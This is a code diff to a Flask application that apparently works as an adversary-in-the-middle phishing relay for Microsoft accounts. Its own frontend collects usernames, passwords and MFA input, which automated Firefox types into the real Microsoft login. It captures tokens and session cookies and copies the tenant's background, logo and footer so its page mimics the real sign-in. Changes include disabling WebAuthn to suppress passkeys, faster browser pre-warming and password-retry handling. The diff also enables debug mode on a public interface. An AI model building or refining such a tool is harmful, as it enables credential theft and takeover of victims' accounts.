@@ -59,6 +59,8 @@ from urllib.parse import urlparse, parse_qs
 from flask import Flask, request, jsonify, render_template, redirect, url_for
 
 from roadtools.roadtx.selenium import SeleniumAuthentication
+from selenium import webdriver as _selenium_webdriver
+from selenium.webdriver.firefox.options import Options as _FirefoxOptions
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
@@ -67,6 +69,8 @@ from selenium.common.exceptions import (
     ElementClickInterceptedException,
     ElementNotInteractableException,
     NoSuchElementException,
+    NoSuchWindowException,
+    StaleElementReferenceException,
 )
 
 from roadtools.roadlib.auth import Authentication, AuthenticationException, WELLKNOWN_CLIENTS, WELLKNOWN_RESOURCES
@@ -85,8 +89,8 @@ RESOURCE = WELLKNOWN_RESOURCES["msgraph"]
 REDIRURL = "https://login.microsoftonline.com/common/oauth2/nativeclient"
 DRIVERPATH = os.environ.get("GECKODRIVER_PATH")
 HEADLESS = False
-STEP_TIMEOUT = 300
-POLL_TIMEOUT_OVERALL = 600  # background job gives up after this long total
+STEP_TIMEOUT = 60
+POLL_TIMEOUT_OVERALL = 300  # background job gives up after this long total
 
 # Live browser session cookies captured from the interactive flow are written
 # here, mirroring roadtx's own .roadtools_auth convention (same directory).
@@ -98,6 +102,7 @@ SESSION_COOKIES_FILE = Path(__file__).parent / ".roadtools_sessioncookies.json"
 # ---------------------------------------------------------------------------
 
 class Stage(str, Enum):
+    STARTING = "starting"                           # background thread is launching Firefox
     ENTERING_PASSWORD = "entering_password"
     AWAITING_ORG_LOGIN = "awaiting_org_login"      # redirected to a third-party/federated IdP
     AWAITING_MFA_CHOICE = "awaiting_mfa_choice"    # push screen, with a "use another way" link
@@ -119,11 +124,104 @@ class LoginSession:
     background_image: Optional[str] = None
     logo: Optional[str] = None
     footer_text: Optional[str] = None
+    browser_ready: bool = False   # True once Firefox is on the password page
     lock: threading.Lock = field(default_factory=threading.Lock)
 
 
 _sessions: dict[str, LoginSession] = {}
 _sessions_lock = threading.Lock()
+
+# ---------------------------------------------------------------------------
+# Pre-warmed Firefox pool — one ready instance kept alive so /login/username
+# can skip the ~5s Firefox cold-start entirely.
+# ---------------------------------------------------------------------------
+
+_warm_pool: list  = []          # holds (selauth, auth) tuples
+_warm_lock = threading.Lock()
+_POOL_SIZE = 1                   # keep one instance warm at all times
+
+
+def _is_driver_alive(driver) -> bool:
+    """Return True if the driver's current browsing context still exists."""
+    try:
+        _ = driver.window_handles  # raises if driver is dead
+        return True
+    except Exception:
+        return False
+
+
+def _make_firefox_driver(service):
+    """Create a Firefox WebDriver with WebAuthn disabled (suppresses passkey prompts)."""
+    opts = _FirefoxOptions()
+    if HEADLESS:
+        opts.add_argument("-headless")
+    # Disable WebAuthn/FIDO2 so Microsoft never shows a passkey prompt in the
+    # automated browser — without this, headless (and even visible) Firefox
+    # triggers a native macOS Touch ID dialog that Selenium cannot dismiss.
+    opts.set_preference("dom.webauthn.enabled", False)
+    opts.set_preference("security.webauth.webauthn", False)
+    return _selenium_webdriver.Firefox(service=service, options=opts)
+
+
+def _spawn_warm_instance() -> None:
+    """Launch Firefox in background, navigate to login page, park it in pool."""
+    try:
+        auth = Authentication(client_id=CLIENT_ID)
+        deviceauth = DeviceAuthentication(auth)
+        selauth = SeleniumAuthentication(auth, deviceauth, REDIRURL, headless=HEADLESS)
+        service = selauth.get_service(DRIVERPATH)
+        if not service:
+            return
+        selauth.driver = _make_firefox_driver(service)
+        selauth.driver.response_interceptor = selauth.redir_interceptor
+        # Navigate to login page so it's already loaded when needed
+        authority = auth.get_authority_url()
+        login_url = (
+            f"{authority}/oauth2/authorize"
+            f"?client_id={CLIENT_ID}&resource={RESOURCE}"
+            f"&redirect_uri={REDIRURL}&response_type=code&prompt=login"
+        )
+        selauth.driver.get(login_url)
+        with _warm_lock:
+            _warm_pool.append((selauth, auth))
+    except Exception:
+        pass  # silently skip — cold-start fallback still works
+
+
+def _take_warm_instance():
+    """Pop a pre-warmed (selauth, auth) pair, then refill the pool in background.
+
+    Validates that the popped instance is still alive before returning it;
+    discards stale/dead instances and tries the next one.
+    """
+    taken = None
+    with _warm_lock:
+        while _warm_pool:
+            candidate = _warm_pool.pop(0)
+            selauth, _auth = candidate
+            if _is_driver_alive(selauth.driver):
+                taken = candidate
+                break
+            # Dead instance — quit it silently in background
+            threading.Thread(
+                target=_quit_driver_safely, args=(selauth.driver,), daemon=True
+            ).start()
+
+    return taken
+
+
+def _new_selauth() -> SeleniumAuthentication:
+    auth = Authentication(client_id=CLIENT_ID)
+    deviceauth = DeviceAuthentication(auth)
+    selauth = SeleniumAuthentication(auth, deviceauth, REDIRURL, headless=HEADLESS)
+
+    service = selauth.get_service(DRIVERPATH)
+    if not service:
+        raise RuntimeError("geckodriver not found — check DRIVERPATH")
+
+    selauth.driver = _make_firefox_driver(service)
+    selauth.driver.response_interceptor = selauth.redir_interceptor
+    return selauth
 
 
 def _build_login_url(auth: Authentication) -> str:
@@ -136,20 +234,6 @@ def _build_login_url(auth: Authentication) -> str:
         f"&response_type=code"
         f"&prompt=login"
     )
-
-
-def _new_selauth() -> SeleniumAuthentication:
-    auth = Authentication(client_id=CLIENT_ID)
-    deviceauth = DeviceAuthentication(auth)
-    selauth = SeleniumAuthentication(auth, deviceauth, REDIRURL, headless=HEADLESS)
-
-    service = selauth.get_service(DRIVERPATH)
-    if not service:
-        raise RuntimeError("geckodriver not found — check DRIVERPATH")
-
-    selauth.driver = selauth.get_webdriver(service)
-    selauth.driver.response_interceptor = selauth.redir_interceptor
-    return selauth
 
 
 def _extract_code_from_url(driver) -> Optional[str]:
@@ -175,65 +259,97 @@ def _quit_driver_safely(driver) -> None:
 
 def _capture_branding(driver) -> dict:
     """
-    Best-effort scrape of the tenant's custom branding from Microsoft's own
-    login page: the background image, the company logo, and any footer/
-    boilerplate text (e.g. "contact support at ..."). Every field is None
-    if not found — the frontend only renders what's actually present.
+    Capture Microsoft login page branding.
+
+    Background: takes a Selenium screenshot and returns it as a base64 data
+    URL — this works for ALL account types (consumer live.com, work/school
+    aad, federated) regardless of how Microsoft sets the background (CSS,
+    inline img, shadow DOM, etc.).  The heavy CSS blur in the frontend hides
+    the Microsoft password-card that appears in the screenshot, leaving only
+    the colour/texture of the background visible.
+
+    Logo + footer: scraped from the DOM as before.
     """
     try:
-        result = driver.execute_script("""
-            const out = { background_image: null, logo: null, footer_text: null };
+        out: dict = {"background_image": None, "logo": None, "footer_text": None}
 
-            // Background image: same detection as before.
+        # --- Background: try to grab the actual background image URL first ---
+        # New Fluent UI (login.live.com) renders a full-page <img role="presentation">
+        # as the very first element on the page; that's the background image.
+        # Fall back to Selenium screenshot (works for any page structure).
+        try:
+            bg_url = driver.execute_script("""
+                // 1. Fluent UI: large <img role="presentation"> (covers full viewport)
+                const vp = window.innerWidth * window.innerHeight;
+                for (const img of document.querySelectorAll('img[role="presentation"]')) {
+                    if (!img.src) continue;
+                    const r = img.getBoundingClientRect();
+                    if (r.width * r.height > vp * 0.2) return img.src;
+                }
+                // 2. Any large <img> covering >20% of viewport
+                let bestSrc = null, bestArea = 0;
+                for (const img of document.querySelectorAll('img')) {
+                    if (!img.src || img.src.startsWith('data:')) continue;
+                    const r = img.getBoundingClientRect();
+                    const area = r.width * r.height;
+                    if (area > vp * 0.2 && area > bestArea) {
+                        bestArea = area; bestSrc = img.src;
+                    }
+                }
+                if (bestSrc) return bestSrc;
+                // 3. CSS background-image on known MS containers
+                for (const id of ['boBackground','background','backgroundImage','loginBackground']) {
+                    const el = document.getElementById(id);
+                    if (!el) continue;
+                    const bg = (el.style.backgroundImage ||
+                                window.getComputedStyle(el).backgroundImage);
+                    const m = bg && bg.match(/url\\(['"]?([^'"\\)]+)['"]?\\)/);
+                    if (m && m[1] && m[1].startsWith('http')) return m[1];
+                }
+                return null;
+            """)
+            if bg_url:
+                out["background_image"] = bg_url
+        except Exception:
+            pass
+
+        # Screenshot fallback: guaranteed to capture whatever the browser shows.
+        if not out["background_image"]:
+            try:
+                b64 = driver.get_screenshot_as_base64()
+                if b64:
+                    out["background_image"] = f"data:image/png;base64,{b64}"
+            except Exception:
+                pass
+
+        # --- Logo: known Microsoft element IDs first, then banner-class img ---
+        logo_js = driver.execute_script("""
             const bannerLogo = document.getElementById('bannerLogo');
-            if (bannerLogo && bannerLogo.src) {
-                out.logo = bannerLogo.src;
+            if (bannerLogo && bannerLogo.src) return bannerLogo.src;
+            for (const img of document.querySelectorAll('img')) {
+                const id = img.id || '', cls = img.className || '';
+                if ((id.includes('banner') || cls.includes('banner')) && img.src)
+                    return img.src;
             }
-
-            const images = document.querySelectorAll('img');
-            if (!out.logo) {
-                for (let img of images) {
-                    const id = img.id || '';
-                    const className = img.className || '';
-                    if ((id.includes('banner') || className.includes('banner')) && img.src) {
-                        out.logo = img.src;
-                        break;
-                    }
-                }
-            }
-
-            const allElements = document.querySelectorAll('*');
-            for (let el of allElements) {
-                const bg = window.getComputedStyle(el).backgroundImage;
-                if (bg && bg !== 'none' && bg.includes('url(')) {
-                    const match = bg.match(/url\\(['\"]?(.+?)['\"]?\\)/);
-                    if (match && match[1]) {
-                        out.background_image = match[1];
-                        break;
-                    }
-                }
-            }
-
-            // Footer / boilerplate text (tenant-configured support contact,
-            // terms links, etc). Microsoft renders this as custom sign-in
-            // page text, most reliably found at #footerTextContent (a leaf
-            // div holding just that string) or #idBoilerPlateText. Capped at
-            // 200 chars and required to be a leaf-ish node (no nested form
-            // controls) so a broad fallback selector can't accidentally
-            // sweep up the whole page's text.
-            const footerCandidateIds = ['footerTextContent', 'idBoilerPlateText', 'idDiv_SAOTCC_Title'];
-            for (const id of footerCandidateIds) {
-                const el = document.getElementById(id);
-                const text = el && el.innerText && el.innerText.trim();
-                if (text && text.length <= 200 && !el.querySelector('input, button, form')) {
-                    out.footer_text = text;
-                    break;
-                }
-            }
-
-            return out;
+            return null;
         """)
-        return result or {}
+        if logo_js:
+            out["logo"] = logo_js
+
+        # --- Footer: tenant-configured boilerplate text ---
+        footer_js = driver.execute_script("""
+            for (const id of ['footerTextContent','idBoilerPlateText','idDiv_SAOTCC_Title']) {
+                const el = document.getElementById(id);
+                const txt = el && el.innerText && el.innerText.trim();
+                if (txt && txt.length <= 200 && !el.querySelector('input,button,form'))
+                    return txt;
+            }
+            return null;
+        """)
+        if footer_js:
+            out["footer_text"] = footer_js
+
+        return out
     except Exception:
         return {}
 
@@ -253,16 +369,36 @@ def _username_error_text(driver) -> Optional[str]:
     return text if text and el.is_displayed() else None
 
 
+# Microsoft-owned sign-in domains — personal accounts redirect to login.live.com,
+# government clouds use microsoftonline.us, etc.  None of these are third-party.
+_MICROSOFT_OWNED_DOMAINS = {
+    "login.microsoftonline.com",
+    "login.microsoft.com",
+    "login.live.com",
+    "account.live.com",
+    "login.microsoftonline.us",          # US Government
+    "login.partner.microsoftonline.cn",  # China
+}
+
+
 def _is_federated_redirect(driver) -> Optional[str]:
     """
     Returns the redirected-to domain if the browser has navigated away from
-    login.microsoftonline.com (i.e. the tenant is federated to a third-party
-    IdP), or None if we're still on Microsoft's own login pages.
+    ALL Microsoft-owned sign-in domains (i.e. the tenant is truly federated to
+    a third-party IdP like ADFS, Okta, or GoDaddy-hosted M365).
+    Returns None when we're still on any Microsoft-owned page.
     """
-    domain = urlparse(driver.current_url).netloc
-    if domain and "login.microsoftonline.com" not in domain and "login.microsoft.com" not in domain:
-        return domain
-    return None
+    try:
+        netloc = urlparse(driver.current_url).netloc.lower()
+    except Exception:
+        return None
+    if not netloc:
+        return None
+    # Strip port if present
+    domain = netloc.split(":")[0]
+    if any(domain == ms or domain.endswith("." + ms) for ms in _MICROSOFT_OWNED_DOMAINS):
+        return None
+    return domain
 
 
 # ---------------------------------------------------------------------------
@@ -279,6 +415,60 @@ _MFA_OPTION_PATTERNS = [
 ]
 
 _SWITCH_METHOD_LINK_TEXT = "can't use my Microsoft Authenticator app"
+
+# Substrings that appear in Microsoft's password-error messages across
+# login.microsoftonline.com and login.live.com.
+_MS_PASSWORD_ERROR_FRAGMENTS = [
+    "password is incorrect",
+    "account or password is incorrect",
+    "That Microsoft account doesn't exist",
+    "account doesn't exist",
+]
+
+
+def _get_password_error(driver) -> Optional[str]:
+    """Return the visible password-error text shown by Microsoft, or None."""
+    # 1. Known element IDs (login.microsoftonline.com)
+    for el_id in ("passwordError", "idTD_PwdGreeting"):
+        try:
+            el = driver.find_element(By.ID, el_id)
+            if el.is_displayed():
+                txt = el.text.strip()
+                if txt:
+                    return txt
+        except (NoSuchElementException, StaleElementReferenceException):
+            pass
+
+    # 2. aria-live alert elements (login.live.com surfaces errors this way)
+    for css in ('div[aria-live="assertive"]', '[role="alert"]'):
+        try:
+            els = driver.find_elements(By.CSS_SELECTOR, css)
+            for el in els:
+                if el.is_displayed():
+                    txt = el.text.strip()
+                    if txt and any(f in txt.lower() for f in _MS_PASSWORD_ERROR_FRAGMENTS):
+                        return txt
+        except (NoSuchElementException, StaleElementReferenceException):
+            pass
+
+    # 3. Broad text-fragment fallback — but restrict to leaf-ish nodes so we
+    #    don't return the entire page text when the fragment matches an ancestor.
+    for fragment in _MS_PASSWORD_ERROR_FRAGMENTS:
+        try:
+            # prefer the deepest (last()) element matching the text
+            el = driver.find_element(
+                By.XPATH,
+                f"(//*[contains(normalize-space(.), {_xpath_literal(fragment)})"
+                f" and not(.//*[contains(normalize-space(.), {_xpath_literal(fragment)})])])[last()]"
+            )
+            if el.is_displayed():
+                txt = el.text.strip()
+                if txt:
+                    return txt
+        except (NoSuchElementException, StaleElementReferenceException):
+            pass
+
+    return None
 
 
 def _xpath_literal(s: str) -> str:
@@ -370,9 +560,10 @@ def session_safe(stage_on_error: Optional[Stage] = None):
                     session.error = str(exc)
                     if stage_on_error:
                         session.stage = stage_on_error
-            finally:
+                # Only quit the driver on an unexpected error — a clean return
+                # (e.g. wrong-password detected) leaves the driver open for retry.
                 try:
-                    session.selauth.driver.close()
+                    session.selauth.driver.quit()
                 except Exception:
                     pass
         return wrapper
@@ -390,15 +581,40 @@ def _finish_credentials_flow(username: str, session: LoginSession, driver) -> No
     """
     started = time.time()
 
-    try:
-        WebDriverWait(driver, 5).until(
-            lambda d: "?code=" in d.current_url or d.find_element(By.ID, "KmsiDescription")
-        )
-        if "?code=" not in driver.current_url:
+    # Handle "Stay signed in?" / KMSI interstitial.
+    # Classic MSOID UI: KmsiDescription + idSIButton9
+    # New Fluent UI (login.live.com): data-testid="acceptButton" or button text "Yes"
+    def _is_kmsi_screen(d):
+        if "?code=" in d.current_url:
+            return True
+        for el_id in ("KmsiDescription",):
             try:
-                _click_robust(driver, driver.find_element(By.ID, "idSIButton9"))
-            except (NoSuchElementException, ElementNotInteractableException):
+                if d.find_element(By.ID, el_id).is_displayed():
+                    return True
+            except (NoSuchElementException, StaleElementReferenceException):
                 pass
+        for sel in ('[data-testid="acceptButton"]', '[data-testid="kmsiForm"]'):
+            try:
+                if d.find_element(By.CSS_SELECTOR, sel).is_displayed():
+                    return True
+            except (NoSuchElementException, StaleElementReferenceException):
+                pass
+        return False
+
+    try:
+        WebDriverWait(driver, 5).until(_is_kmsi_screen)
+        if "?code=" not in driver.current_url:
+            # Try classic idSIButton9 first, then Fluent UI acceptButton
+            for by, sel in [(By.ID, "idSIButton9"),
+                            (By.CSS_SELECTOR, '[data-testid="acceptButton"]')]:
+                try:
+                    btn = driver.find_element(by, sel)
+                    if btn.is_displayed():
+                        _click_robust(driver, btn)
+                        break
+                except (NoSuchElementException, ElementNotInteractableException,
+                        StaleElementReferenceException):
+                    pass
     except TimeoutException:
         pass
 
@@ -406,10 +622,18 @@ def _finish_credentials_flow(username: str, session: LoginSession, driver) -> No
         if "?code=" in driver.current_url:
             break
         stage = _classify_screen(driver)
+        # Detect Microsoft's inline "password is incorrect" error so the
+        # ROADtools UI can surface it and let the user retry.
+        pw_error = _get_password_error(driver) if stage == Stage.ENTERING_PASSWORD else None
         with session.lock:
             session.stage = stage
+            session.error = pw_error          # None clears stale error on re-try
             session.mfa_options = _scrape_mfa_options(driver) if stage == Stage.AWAITING_MFA_CHOICE else []
-        time.sleep(1.5)
+        if pw_error:
+            # Wrong password — stop polling so the frontend can re-enable the
+            # password field for a retry without killing the browser.
+            return
+        time.sleep(0.5)
 
     code = _extract_code_from_url(driver)
     if not code:
@@ -432,20 +656,92 @@ def _finish_credentials_flow(username: str, session: LoginSession, driver) -> No
         session.tokens = tokens
         session.stage = Stage.SUCCEEDED
 
+    # Browser is no longer needed — clean it up in the background.
+    threading.Thread(target=_quit_driver_safely, args=(driver,), daemon=True).start()
+
+
+def _find_password_input(driver):
+    """Return the first visible password input, trying known Microsoft IDs first
+    then falling back to a generic CSS selector (covers login.live.com variants)."""
+    # Preferred: known Microsoft identity platform IDs
+    # i0118 = classic MSOID/AAD UI; passwordEntry = new Fluent UI (login.live.com)
+    for el_id in ("i0118", "passwordEntry"):
+        try:
+            el = driver.find_element(By.ID, el_id)
+            if el.is_displayed():
+                return el
+        except (NoSuchElementException, StaleElementReferenceException):
+            pass
+    # Fallback: any visible password input
+    try:
+        el = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
+        if el.is_displayed():
+            return el
+    except (NoSuchElementException, StaleElementReferenceException):
+        pass
+    return None
+
+
+def _find_submit_button(driver):
+    """Return the first visible submit button, trying known IDs first."""
+    for by, selector in [
+        (By.ID, "idSIButton9"),
+        (By.CSS_SELECTOR, "button[type='submit']"),
+        (By.CSS_SELECTOR, "input[type='submit']"),
+    ]:
+        try:
+            el = driver.find_element(by, selector)
+            if el.is_displayed():
+                return el
+        except (NoSuchElementException, StaleElementReferenceException):
+            pass
+    return None
+
 
 @session_safe(stage_on_error=Stage.FAILED)
 def _run_password_job(username: str, password: str):
     with _sessions_lock:
         session = _sessions.get(username)
 
+    # The user might submit their password before Firefox has finished typing
+    # the email and reaching the password page.  Wait here until the username
+    # background job signals it's done (browser_ready), or until we time out.
+    wait_deadline = time.time() + STEP_TIMEOUT
+    while time.time() < wait_deadline:
+        with session.lock:
+            if session.browser_ready:
+                break
+            if session.stage == Stage.FAILED:
+                return  # username step already failed; nothing to do
+        time.sleep(0.25)
+
     driver = session.selauth.driver
 
-    # Wait for password field to appear
-    els = WebDriverWait(driver, STEP_TIMEOUT).until(lambda d: d.find_element(By.ID, "i0118"))
+    # Clear any previous wrong-password error so the frontend shows "Signing in..."
+    # cleanly while we type the new attempt.
+    with session.lock:
+        session.error = None
 
-    els.send_keys(password)
+    # Wait for password field (i0118 on MSOID, or any password input on live.com).
+    # live.com can re-render the field after it first appears, so retry on stale.
+    deadline = time.time() + STEP_TIMEOUT
+    while True:
+        pw_el = WebDriverWait(driver, max(1.0, deadline - time.time())).until(
+            lambda d: _find_password_input(d)
+        )
+        try:
+            pw_el.clear()
+            pw_el.send_keys(password)
+            break
+        except StaleElementReferenceException:
+            if time.time() >= deadline:
+                raise
+            time.sleep(0.3)
 
-    submit = WebDriverWait(driver, STEP_TIMEOUT).until(lambda d: d.find_element(By.ID, "idSIButton9"))
+    # Click submit (idSIButton9 on MSOID, or first submit button)
+    submit = WebDriverWait(driver, STEP_TIMEOUT).until(
+        lambda d: _find_submit_button(d)
+    )
     _click_robust(driver, submit)
 
     _finish_credentials_flow(username, session, driver)
@@ -477,6 +773,9 @@ app.register_blueprint(dashboard_bp)
 app.register_blueprint(actions_bp)
 init_admin_db()
 
+# Pre-warm one Firefox instance in the background so the first login is fast.
+threading.Thread(target=_spawn_warm_instance, daemon=True).start()
+
 
 @app.route("/")
 def index():
@@ -492,6 +791,171 @@ def minisoft_page():
     return render_template("minisoft.html")
 
 
+def _recover_window(driver) -> bool:
+    """If the current browsing context was discarded, try switching to the first
+    surviving window handle. Returns True if recovery succeeded."""
+    try:
+        handles = driver.window_handles
+        if handles:
+            driver.switch_to.window(handles[0])
+            return True
+    except Exception:
+        pass
+    return False
+
+
+def _poll_for_password_screen(driver, deadline: float) -> None:
+    """
+    Loop until the Microsoft password field (i0118), federated redirect, auth
+    code in URL, or a username error appears — whichever comes first.
+
+    Handles two interstitials automatically:
+    • Passkey error page  → clicks "Sign in another way"
+    • Browsing context discarded (Touch ID cancelled / passkey popup closed)
+      → switches to the first surviving window handle and continues
+
+    Raises TimeoutException if the deadline passes without a terminal state.
+    Raises RuntimeError (with a short user-facing message) for username errors.
+    """
+    while True:
+        if time.time() > deadline:
+            raise TimeoutException("Timed out waiting for the username/password screen.")
+
+        try:
+            # ── Passkey / WebAuthn error interstitial ──────────────────────
+            # Microsoft shows "Sign in another way" when the passkey flow fails.
+            try:
+                link = driver.find_element(By.PARTIAL_LINK_TEXT, "Sign in another way")
+                if link.is_displayed():
+                    link.click()
+                    time.sleep(1.0)
+                    continue
+            except (NoSuchElementException, StaleElementReferenceException):
+                pass
+
+            # ── Password field ─────────────────────────────────────────────
+            # login.microsoftonline.com uses #i0118; login.live.com (personal
+            # accounts) uses the same ID but sometimes also exposes a
+            # type="password" input when the account is recognised.
+            try:
+                pw = driver.find_element(By.ID, "i0118")
+                if pw.is_displayed():
+                    return  # ← success
+            except (NoSuchElementException, StaleElementReferenceException):
+                pass
+            # Fallback: any visible password input (covers live.com variants)
+            try:
+                pw = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
+                if pw.is_displayed():
+                    return  # ← success
+            except (NoSuchElementException, StaleElementReferenceException):
+                pass
+
+            # ── Auth code already in URL (device-flow shortcut) ────────────
+            if "?code=" in driver.current_url:
+                return
+
+            # ── Federated / third-party IdP redirect ───────────────────────
+            if _is_federated_redirect(driver):
+                return
+
+            # ── Inline username validation error ───────────────────────────
+            err = _username_error_text(driver)
+            if err:
+                raise RuntimeError(err)
+
+        except (NoSuchWindowException, NoSuchElementException) as exc:
+            # "Browsing context has been discarded" — happens when the passkey
+            # OS-level dialog (e.g. macOS Touch ID) is dismissed and Firefox
+            # closes the WebAuthn popup.  Try to recover by switching to any
+            # surviving window; if none exist, propagate the error.
+            if "Browsing context" in str(exc) or isinstance(exc, NoSuchWindowException):
+                if not _recover_window(driver):
+                    raise TimeoutException(
+                        "The browser window was closed unexpectedly (passkey dialog cancelled?). "
+                        "Please try again."
+                    ) from exc
+                time.sleep(0.5)
+                continue
+            raise
+
+        time.sleep(0.4)
+
+
+def _run_username_job(username: str, session: "LoginSession") -> None:
+    """Background worker for /login/username — runs Firefox, types the email,
+    waits for the password / federated-redirect screen, then updates *session*
+    in place so the frontend's /login/status poll can pick up the result."""
+    try:
+        warm = _take_warm_instance()
+        if warm is not None:
+            selauth, auth = warm
+            driver = selauth.driver
+        else:
+            selauth = _new_selauth()
+            auth = selauth.auth
+            driver = selauth.driver
+            driver.get(_build_login_url(auth))
+
+        # Patch the session with the real driver objects now that we have them.
+        with session.lock:
+            session.selauth = selauth
+            session.auth = auth
+
+        el = WebDriverWait(driver, STEP_TIMEOUT).until(lambda d: d.find_element(By.ID, "i0116"))
+        el.send_keys(username + Keys.ENTER)
+
+        _poll_for_password_screen(driver, time.time() + STEP_TIMEOUT)
+
+        # Settle any pending client-side redirect before reading final state.
+        # Check for password field using CSS selector so it works on both
+        # classic MSOID (i0118) and new Fluent UI (passwordEntry).
+        time.sleep(0.5)
+        if "?code=" not in driver.current_url:
+            try:
+                WebDriverWait(driver, 3).until(
+                    lambda d: _find_password_input(d) or _is_federated_redirect(d)
+                )
+            except TimeoutException:
+                pass
+
+        federated_domain = _is_federated_redirect(driver)
+        branding = {} if federated_domain else _capture_branding(driver)
+
+        with session.lock:
+            session.stage = Stage.AWAITING_ORG_LOGIN if federated_domain else Stage.ENTERING_PASSWORD
+            session.federated_domain = federated_domain
+            session.background_image = branding.get("background_image")
+            session.logo = branding.get("logo")
+            session.footer_text = branding.get("footer_text")
+            session.browser_ready = True   # Firefox is now on the password page
+
+        # Now that the password screen is ready, pre-warm the next Firefox
+        # instance in background — this way only ONE Firefox is visible during
+        # the email-validation step, and the second one appears after the user
+        # is already on the password screen.
+        threading.Thread(target=_spawn_warm_instance, daemon=True).start()
+
+    except TimeoutException as exc:
+        with session.lock:
+            session.stage = Stage.FAILED
+            session.error = str(exc)
+    except RuntimeError as exc:
+        # Short user-facing message (e.g. username validation error)
+        threading.Thread(target=_quit_driver_safely,
+                         args=(session.selauth.driver if session.selauth else None,),
+                         daemon=True).start()
+        with session.lock:
+            session.stage = Stage.FAILED
+            session.error = str(exc)
+    except Exception as exc:
+        with session.lock:
+            session.stage = Stage.FAILED
+            # Strip noisy Selenium stacktraces from the user-facing message
+            msg = str(exc).split("\n")[0].replace("Message: ", "").strip()
+            session.error = msg or "An unexpected error occurred."
+
+
 @app.route("/login/username", methods=["POST"])
 def login_username():
     data = request.get_json(force=True) or {}
@@ -504,89 +968,25 @@ def login_username():
         if existing is not None:
             if time.time() - existing.created_at < POLL_TIMEOUT_OVERALL:
                 return jsonify({"ok": False, "output": "A login is already in progress for this username."}), 409
-            # Stale session past the overall timeout — abandoned by a crashed
-            # job or a frontend that stopped polling. Clean it up and let this
-            # attempt through instead of blocking forever.
             _sessions.pop(username, None)
-            threading.Thread(target=_quit_driver_safely, args=(existing.selauth.driver,), daemon=True).start()
+            if existing.selauth and existing.selauth.driver:
+                threading.Thread(target=_quit_driver_safely, args=(existing.selauth.driver,), daemon=True).start()
 
-    try:
-        selauth = _new_selauth()
-        auth = selauth.auth
-        driver = selauth.driver
-
-        driver.get(_build_login_url(auth))
-
-        el = WebDriverWait(driver, STEP_TIMEOUT).until(lambda d: d.find_element(By.ID, "i0116"))
-        el.send_keys(username + Keys.ENTER)
-
-        # Wait for EITHER Microsoft's own password field actually becoming
-        # the active step, a completed auth code, a navigation away from
-        # login.microsoftonline.com entirely (federated tenant redirecting
-        # to its own IdP — GoDaddy-hosted M365, ADFS, Okta, etc.), OR an
-        # inline validation error on the username field itself. #i0118 can
-        # be present-but-hidden in the DOM before it's the active step, so
-        # presence alone isn't enough — it must actually be displayed.
-        WebDriverWait(driver, STEP_TIMEOUT).until(
-            lambda d: (d.find_element(By.ID, "i0118").is_displayed())
-            or "?code=" in d.current_url
-            or _is_federated_redirect(d)
-            or _username_error_text(d)
-        )
-
-        username_error = _username_error_text(driver)
-        if username_error:
-            # Don't let a slow/hung driver teardown block this response —
-            # quit it in the background and return the error immediately.
-            threading.Thread(target=_quit_driver_safely, args=(driver,), daemon=True).start()
-            return jsonify({"ok": False, "output": username_error}), 400
-
-        # The check above can fire on a TRANSIENT state — some tenants show
-        # Microsoft's own page (with i0118 briefly present) for an instant
-        # before a client-side JS redirect sends the browser on to a
-        # third-party IdP. Give any pending redirect a moment to actually
-        # complete, then make the real flow decision off the settled state
-        # rather than the first instant something looked true.
-        time.sleep(1.5)
-        if "?code=" not in driver.current_url:
-            try:
-                WebDriverWait(driver, 5).until(
-                    lambda d: d.find_element(By.ID, "i0118") or _is_federated_redirect(d)
-                )
-            except TimeoutException:
-                pass  # settled on neither — fall through to whatever _is_federated_redirect reports below
-
-    except TimeoutException:
-        return jsonify({"ok": False, "output": "Timed out waiting for the username/password screen."}), 504
-    except Exception as exc:
-        return jsonify({"ok": False, "output": str(exc)}), 500
-
-    federated_domain = _is_federated_redirect(driver)
-
-    branding = {} if federated_domain else _capture_branding(driver)
-
-    with _sessions_lock:
-        _sessions[username] = LoginSession(
-            selauth=selauth,
-            auth=auth,
+        # Create a placeholder session immediately so /login/status can report
+        # "starting" while the background thread fires up Firefox.
+        # selauth/auth are set to None temporarily; the worker fills them in.
+        placeholder = LoginSession(
+            selauth=None,  # type: ignore[arg-type]
+            auth=None,     # type: ignore[arg-type]
             created_at=time.time(),
-            stage=Stage.AWAITING_ORG_LOGIN if federated_domain else Stage.ENTERING_PASSWORD,
-            federated_domain=federated_domain,
-            background_image=branding.get("background_image"),
-            logo=branding.get("logo"),
-            footer_text=branding.get("footer_text"),
+            stage=Stage.STARTING,
         )
+        _sessions[username] = placeholder
 
-    return jsonify({
-        "ok": True,
-        "username": username,
-        "status": "awaiting_password",
-        "flow": "federated" if federated_domain else "microsoft",
-        "federated_domain": federated_domain,
-        "background_image": branding.get("background_image"),
-        "logo": branding.get("logo"),
-        "footer_text": branding.get("footer_text"),
-    })
+    # Launch the browser work in a daemon thread — return to the caller NOW.
+    threading.Thread(target=_run_username_job, args=(username, placeholder), daemon=True).start()
+
+    return jsonify({"ok": True, "username": username, "status": "starting"})
 
 
 @app.route("/login/password", methods=["POST"])
@@ -687,7 +1087,7 @@ def login_cancel():
     with _sessions_lock:
         session = _sessions.pop(username, None)
 
-    if session is not None:
+    if session is not None and session.selauth is not None:
         threading.Thread(target=_quit_driver_safely, args=(session.selauth.driver,), daemon=True).start()
 
     return jsonify({"ok": True})
@@ -754,4 +1154,4 @@ def login_mfa_code():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5050)), debug=False)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5050)), debug=True, use_reloader=True)
